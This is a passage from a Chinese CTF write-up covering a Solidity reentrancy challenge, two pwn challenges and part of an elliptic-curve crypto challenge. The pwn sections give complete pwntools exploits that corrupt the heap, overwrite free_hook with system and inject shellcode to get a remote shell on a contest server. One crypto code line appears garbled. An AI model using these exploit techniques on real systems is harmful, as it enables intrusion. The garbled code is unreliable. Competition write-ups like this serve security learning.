               stop
           }
       }
    }
###  SafeContract
题目比较简单，主要是为了让
这里成功变成1  
但是  
那么就只需要观察这里的转账 发现肯定是可以打 重入的
那么基本就成了。
可以发现这几种函数，我们只需要：
  * 先随便 deposit()一个
  * 然后fallback()写不断withdraw的
  * 最后调用withdraw()即可。  
不过 withdraw中有几个限制，比如先打的钱要比后打的多。  
只能打10次。注意调整数值即可。
就可以打通了。
###  apollo
先泄露libc基址，malloc出8个0xa0大小堆块并free掉，再重新malloc出一个，show得到地址。
然后当赛道上某处值为2或3就可向下移动2行，这意味着可以溢出到下一块相邻堆块的size字段。只需要将size改大，free掉再重新malloc就能够修改后面第二块堆块的fd，改free_hook分配出来改system即可。
exp:
    from pwn import *
    context.log_level='debug'
    def add(row,col,size):
        payload=p8(42)+p8(row)+p8(col)+p8(size&0xff)+p8((size&0xff00)>>8)
        return payload
    def free(row,col):
        payload=p8(47)+p8(row)+p8(col)
        return payload
    def set_path(row,col,num):
        payload=p8(43)+p8(row)+p8(col)+p8(num)
        return payload
    def set_zero(row,col):
        payload=p8(45)+p8(row)+p8(col)
        return payload
    def up():
        payload=p8(119)
        return payload
    def down():
        payload=p8(115)
        return payload
    def left():
        payload=p8(97)
        return payload
    def right():
        payload=p8(100)
        return payload
    def show():
        payload=p8(112)
        return payload
    #sh=remote('127.0.0.1',23333)
    sh=remote('8.140.179.11',13422)
    payload=p8(77)+p8(0x10)+p8(0x10)
    payload+=add(1,1,0x90)
    payload+=add(1,2,0x30)
    for i in range(7):
        payload+=add(1,i+3,0x90)
    payload+=add(1,10,0x30)+free(1,10)
    for i in range(7):
        payload+=free(1,i+3)
    payload+=free(1,1)
    payload+=add(1,1,0x90)
    payload+=show()
    payload+=set_path(0xf,8,2)
    for i in range(6):
        payload+=right()*0xf+left()*0xf
    payload+=right()*3+left()*3
    payload+=right()*8+left()*8
    payload+=down()*4
    payload+=right()*8
    payload+=down()*0xb
    payload+=free(1,1)+free(1,2)
    payload+=add(1,1,0xd0)+add(1,2,0x30)+add(1,3,0x30)
    payload+=add(1,11,0x40)+free(1,11)
    sh.sendafter('cmd> ',payload)
    pause()
    sh.send('\x00'*0x90)
    sh.send('\x00'*0x30)
    for i in range(7):
        sh.send('\x00'*0x90)
    sh.send('\x00'*0x30)
    sh.send('a')
    sh.recvuntil('pos:1,1\n')
    libc_base=u64(sh.recv(3).ljust(8,'\x00'))-0x15d861+0x4000000000 
    print(hex(libc_base))
    free_hook=libc_base+0x156630
    system_addr=libc_base+0x3F2C8
    pause()
    payload='\x00'*0x90+p64(0)+p64(0x41)+p64(free_hook)
    sh.send(payload.ljust(0xd0,'\x00'))
    sh.send('\x00'*0x30)
    sh.send(p64(system_addr))
    pause()
    sh.send("/bin/sh\x00")
    sh.interactive()
###  quiet
用5和1的函数把shellcode写入，再用9跳转即可
exp:
    #! python3
    #coding:utf-8
    from pwn import *
    import subprocess, sys, os
    sa = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    elf_path = './quiet'
    ip = '8.140.179.11'
    port = 51322
    remote_libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
    context(os='linux', arch='aarch64')
    context.log_level = 'debug'
    local = 0
    if local == 1:
        p = process(elf_path)
    else:
        p = remote(ip, port)
    def debug(cmd):
        gdb.attach(p,cmd)
        pause()
    def one_gadget(filename = remote_libc_path):
        return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
    def chose(idx):
        key = {0:8,
            35:5,
            40:0,
            41:1,
            42:2,
            47:3,
            64:4,
            71:9,
            91:6,
            93:7}
        for i in key:
            if key[i] == idx:
                return p8(i)
    shellcode = asm(shellcraft.sh())
    payload = b''
    for i in range(len(shellcode)):
        payload += chose(5)
        payload += chose(1)
    payload += chose(9)
    p.sendafter('cmd> ', payload)
    p.send(shellcode)
    p.interactive()
    p.close()
## Crypto
###  cubic
得到六组解之后直接粘贴在nc上
    def is_valid(x):
        return (((3 - 12*N -4*N^2 - ((2*N + 5)*sqrt(4*N^2 + 4*N -15))) / 2)  = QQ[]
    F = x*(z+x)*(x+y) + y*(y+z)*(x+y) + z*(z+x)*(z+y) - 6*(x+y)*(y+z)*(x+z)
    E = EllipticCurve([0, 4*N^2 + 12*N - 3, 0, 32*(N + 3), 0])
    a, b, c = -8, -7, 5
    x = (-4*(a + b + 2*c)*(N + 3)) / ((2*a + 2*b - c) + (a + b)*N)
    y = (4*(a - b)*(N + 3)*(2*N + 5)) / ((2*a + 2*b - c) + (a + b)*N)
    P = S = E([x, y])
    cnt = 1
    while cnt < 7:
        S = S + P
        if is_valid(S[0][0]):
            x = S[0][0]
            y = S[1][0]
            a, b, c = var('a, b, c')
            aa = (8*(N + 3) - x + y) / (2*(4 - x)*(N + 3))
            bb = (8*(N + 3) - x - y) / (2*(4 - x)*(N + 3))
            cc = (-4*(N + 3) - (N + 2)*x) / ((4 - x)*(N + 3))
            a, b, c = solve([a == aa * (a + b + c), b == bb * (a + b + c), c == cc * (a + b + c)], a, b, c)[0]
            print('solution', cnt)
            print('-' * 64)     
            cnt += 1
            then_res = R(a(nn, dd))
            a = abs(then_res.coefficients()[1].numerator())
            print(a)
            then_res = R(b(nn, dd))
            b = abs(then_res.coefficients()[1].numerator())
            print(b)
            c = abs(then_res.coefficients()[1].denominator())
            print(c)
            print('-' * 64)